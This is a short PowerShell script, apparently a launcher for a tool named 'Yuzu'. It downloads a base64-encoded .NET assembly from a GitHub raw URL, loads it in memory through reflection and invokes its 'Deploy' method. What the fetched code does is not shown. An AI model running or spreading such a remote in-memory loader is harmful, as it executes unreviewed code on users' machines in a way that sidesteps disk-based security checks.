Clear-Host
[Reflection.Assembly]::Load([Convert]::FromBase64String((iwr "https://raw.githubusercontent.com/mi-yuki/Yuzu/main/ld-yz.raw").Content)).GetType("Yuzu.Hosting.YuzuInterpreter").GetMethod("Deploy").Invoke($null, @($null))
